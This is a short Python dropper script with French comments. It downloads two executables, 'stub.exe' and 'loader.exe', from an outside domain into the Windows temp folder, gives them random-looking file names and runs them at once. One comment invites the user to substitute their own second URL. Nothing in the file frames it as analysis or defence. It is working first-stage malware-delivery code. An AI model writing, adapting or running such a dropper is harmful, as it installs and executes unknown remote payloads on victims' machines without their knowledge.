import os, requests

dropper_url1 = "https://lawismyfather.xyz/assets/stub.exe"
temp_dir = os.getenv("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
dropped_path1 = os.path.join(temp_dir, "fkdvsdngfsndfjnsfjnsjf.exe")

dropper_url2 = "https://lawismyfather.xyz/assets/loader.exe"  # Remplacez par votre deuxième URL
dropped_path2 = os.path.join(temp_dir, "sjfnsjdnfjsnf.exe")

with open(dropped_path1, "wb") as f:
    f.write(requests.get(dropper_url1).content)

with open(dropped_path2, "wb") as f:
    f.write(requests.get(dropper_url2).content)

# Exécution des fichiers
os.startfile(dropped_path1)
os.startfile(dropped_path2)
